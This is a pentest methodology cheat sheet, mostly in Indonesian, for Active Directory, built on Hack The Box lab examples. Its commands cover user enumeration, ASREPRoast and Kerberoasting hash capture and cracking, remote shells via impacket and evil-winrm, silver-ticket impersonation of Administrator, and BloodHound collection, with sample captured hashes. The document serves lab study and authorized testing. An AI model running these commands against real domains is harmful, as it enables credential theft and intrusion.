# Active Directory Enumeration
## Tips n Trick
1. Hal terpenting dalam AD adalah username karena dengan username kita bisa melanjutkan proses pentest untuk mendapatkan initial access
2. Biasanya username ini bisa kita gunakan di smb dan rpc
3. Ketika mendapatkan username, cek dengan kerbrute terlebih dahulu untuk memastikan user yang valid
4. Kemudian jika mendapatkan creds, coba di SMB, RPC
5. Kalau bisa di RPC jalankan enumdomusers untuk mendapatkan seluruh username


# You Dont Have Credentials
## Enumerate user yang berada di AD
Hal ini penting untuk initial access dan juga privesc, kita harus tau username yang digunakan untuk login ke AD agar bisa sampai ke DC. berikut adalah cara-caranya

### Menggunakan rpclient dengan null session
```bash
rpcclient 10.10.10.10 -U%
```
Jika berhasil konek, gunakan perintah `enumdomusers`, nantinya akan tampil nama-nama username yang digunakan untuk login

Perintah lainnya
```
enumprinters
```

Untuk perintah lainnya silahkan cek di ref

Ref : https://www.hackingarticles.in/active-directory-enumeration-rpcclient/

### Use [windapsearch](https://github.com/ropnop/go-windapsearch) to make LDAP queries. Often does not require a password!

```bash
# query users
windapsearch -m users --dc DCIP

# query login names
windapsearch -m users --attrs UserPrincipalName --dc DCIP | awk -F"Name:" '{print $2}' | awk '!/^$/'

# descriptions (often contain passwords)
windapsearch -m users --attrs Description --dc DCIP

# query all attributes for password
windapsearch -m users --full --dc DCIP | grep -i password
```


*Pasikan semuanya dicoba karena bisa jadi hasilnya berbeda*


Kalau cara diatas gak bisa, kita harus melakukan Brute Force dengan kerbrute

### Use [kerbrute](https://github.com/ropnop/kerbrute) to enumerate users

```bash
kerbrute userenum --dc DC -d DOMAIN /usr/share/wordlists/seclists/Usernames/Names/names.txt


kerbrute userenum --dc DC -d DOMAIN /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

Example :

kerbrute userenum --dc 10.10.10.100 -d intelligence.htb users.txt
```

### SMB
Jika port SMB 139 & 445 terbuka, maka coba lakukan enumeration, kemungkinan ada juicy file di smb share. Terdapat beberapa cara 

```bash
smbmap -H IP
cme smb IP -u '' -p '' --shares
enum4linux IP
```

user yang kita dapatkan disimpan pada users.txt

## Get User hash with ASREPRoast

ASREPRoast akan mencari user yang tanpa memerlukan pre-authentication Kerberos. cara kerjanya adalah tools ini akan mengirimkan permintaan AS_REQ ke KDC atas nama pengguna mana pun dalam hal ini kita menyiapkan beberapa user yang telah ditemukan, dan attacker dapat menerima pesan AS_REP. Jenis pesan AS_REP ini berisi potongan data yang dienkripsi dengan kunci pengguna asli, yang berasal dari kata sandinya. Kemudian, dengan menggunakan pesan ini, kata sandi pengguna dapat dicrack secara offline

Jika user memiliki settingan pre-authentication maka server membutuhkan user untuk memberikan secret keynya dalam hal ini bisa password user tersebut sehingga pada tool yang nantinya kita gunakan hasilnya `UF_DONT_REQUIRE_PREAUTH set`

oke, untuk melakukan ASREPRoast attack, perintahnya :

```bash
impacket-GetNPUsers htb.local/ -usersfile users.txt -format hashcat
```

Contoh hash jika ditemukan :

```bash
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:423f0b64bb97975d6540afc3350c2468$c377116c391e79b9c0f1bda185bc4065f454d0727e4edebbf5dea14f05f4bd0b3a5cb432205791f98b147dfb0de152c29889fb83a57f560f86aa1673ba4ffa29a9634d87202e33143e9cca2ddb2841409cacfcc1fb2396bf7671b40054336ba5375dc1e8b95883be5b4ab1a068572c72e5cf32a4a1cb967de0b0ef1efd9d02becf2ebf508a629cedeced46e24f3419b9568101a13788cfe1d30f9ec3674b90225a391f91f60d24cb217de0de93ebd026b11da0d715c33af46935deff52d9d7a2d72e51fca0dd9e4ef0712fb750d030f644a8a39f06b2e60bbb72ac47bf40df57c669af9dcf6f
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nut doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User yw doesn't have UF_DONT_REQUIRE_PREAUTH set

```

Hasil diatas adalah kita mendapatkan hash user `svc-alfresco` . 

Jika ingin menyimpan hash yang hanya ditemukan, kita bisa menambahkan parameter `-outputfile`
```bash
python /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile hash.txt
```

*Perhatikan bahwa biasanya yang tidak membutuhkan pre-auth adalah user service*

### Crack hash from ASREPRoast 
Jika sudah mendapatkan hash, kita bisa langsung crack dengan hashcat
```console
hashcat hash.txt /usr/share/wordlists/rockyou.txt
```

# You Have Credentials
Cara ini digunakan ketika kita berhasil mendapatkan credentials pada salah satu user di AD

## Get the shell
```
# common
impacket-psexec DOMAIN/user:password@10.10.10.100
impacket-smbexec DOMAIN/user:password@10.10.10.100
impacket-wmiexec DOMAIN/user:password@10.10.10.100


# winrm (port tcp/5985) need to be enabled
evil-winrm -i IP -u 'DOMAIN\user' -p 'PASSWORD'

# RDP (port tcp/3389) needs to be enabled
rdesktop -r clipboard:PRIMARYCLIPBOARD -r disk:host=/home/ -u 'USER' -p 'PASSWORD'  IP

# rare
impacket-atexec 'DOMAIN\user:PASSWORD@IP' 'command'
impacket-dcomexec 'DOMAIN\user:PASSWORD@IP'
```

## Basic enumeration
```
# get all users
net users /domain

# get the password policy, nantinya kita bisa generate password list dari sini
net accounts

# check for stored credentials
cmdkey /list
```


Basic PowerShell script you can run from a shell inside the AD:

```powershell
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain

# Search by what
$Searcher.filter="serviceprincipalname=*"

$Result = $Searcher.Findall()

Write-Host "---------------------------"
Foreach($obj in $Result)
{
    
    ForEach($prop in $obj.Properties) {
        # uncommnent to print all attributes
        #$prop
    }
    Write-Host "[SAM Account Name]"
    $obj.Properties.samaccountname
    Write-Host ""
    Write-Host "[User Principal Name]"
    $obj.Properties.userprincipalname
    Write-Host ""
    Write-Host "[Service Principal Name]"
    $obj.Properties.serviceprincipalname
    Write-Host "---------------------------"
}
```

## Kerberoasting Attack

Kerberoasting, instead, takes advantage of human nature nearly as much as it exploits known security weaknesses in Kerberos authentication for Active Directory. At its core, Kerberoasting is **a password-cracking attack in which credentials are stolen from memory and cracked offline**

### Get SPNn
 use the `GetUserSPNs` script from Impacket to get a list of service usernames which are associated with normal user accounts. It will also get a ticket that we can crack.
 
```
impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
```

Example output :
```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$862785a3274a83bc48f39e4df111a6f0$1ca9dbefd36c8eb1cca5dc15d94621a718d18580e0d9cf3e9c4413f92d053ff9b95265f1a2ad99aad1f56b30657355a23a2dea8fa967332af05cf6f2bcaacb35a32198b32d6a0e4ae7ddd39ba737bd85cf97b34b57ee7f55f55ce15e56e0df075de2c4f42221e3dcb59a1b398c8913db0df9b7dd1ab846c9a8c94b908ff6ba31ccb41c7710980416aeb27039714e569e3bdd91ed60abd2be54ebb8e9358ef63eeb947df09d9ac19eca549069937f28598c314d45914d365a2ff8e2370e710e5b2355fa660c7a5c62afdac48bf17c2a142a6b75c345dfe4e5e8bbc9e8f5996560cb0c4af0f66b3e9c2ccb0ec2010f1932a1177924f3d2129792b4baac249fc707cebf9f8f63fe601fbf23c60e56713e4e448ce8b62ebb7ecfdadf322f692eaea84cfbfcc5d1c213a96ac2b6c07a1f9ae30191b681a662b97eacb281b25ab3e7df9d26d228b7d77c10d0f96b5a47fbd43912ecfef66e0612a2473b48c79671ef5724ec95bc1a8821a198d97932ef026f84a2836b8d8cb043388f2bf8953e5f0ad3dbde5c4e0ec84ee64cc5e679a4f259fe29edadfdd03f498bf06eb07ab224bcf9010b99bf445708f47730dca3e625bea07a3741b7e0a40d29146fee44895ecd51369650ceef954eedd2a1766cbe3a49f3a7e1c43ebd39cb09a43b33bf4f70da59abaa87effc7ca9eaa11cc800910a31ab1bbfc5457c1700e9255b08e2ec7fb28fb0fc720e64f2574c43572503853cfa35c179d984dee585ed40f264ba73a6c24f78324c74a8eeffb896e149529c2c86f121dda3b73f1cb9944ff7a971bbe7c95e0732bc01655e60d82bd3fc669b9d4256b952f607ef9e3978a325ad178cbc86b9132d7d90d0e9d2f05ab379bbc73a645f4ce5046f5c0ad5a4f4c4475b3f9745f47988ec2620cb5a166684f8e7a727c11a89351ae5750b4a9c156404add16f8dd3ac64681dc50b7d0c2aa127198304768881dbad40329f1d7bb4819b0ca398a6a963e0420b0e65eadc972d31d9c966c298fd4141ceaa18f5dd5857bfe38b51fae6f8f07d561283ab597b51399ac7782e3b8f32390b09d907b8b123ba5606f5159b01c0704dffc99ee425d843527ce499d56356ab835dcc6a4224ef857940cd64293e4ce37e86de3f03286ae50270df5d0a63c22542a22da2a3a965c51e95a80be85321256dcb8413a84e724321ac42682164780337dc74e576e22681782d37b44aead0512d0aa13a5ea88bb55a3f9aa19e9091325a0edac61f2c7b
```

### Crack the Kerberos hash
```
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
```

## Silver Ticket
```
impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int$ -hashes :6bf735e60852b92212d512a4deadcfea
```

### Clock skew too great
Hal ini terjadi ketika mesin attacker dan mesin victim memiliki waktu yang berbeda. Solution :
```
sudo ntpdate 10.10.10.248
```

## Bloodhound
```
bloodhound-python -u svc-print -p 'password' -d fabricorp.local -ns 10.10.10.193 -c All --zip
```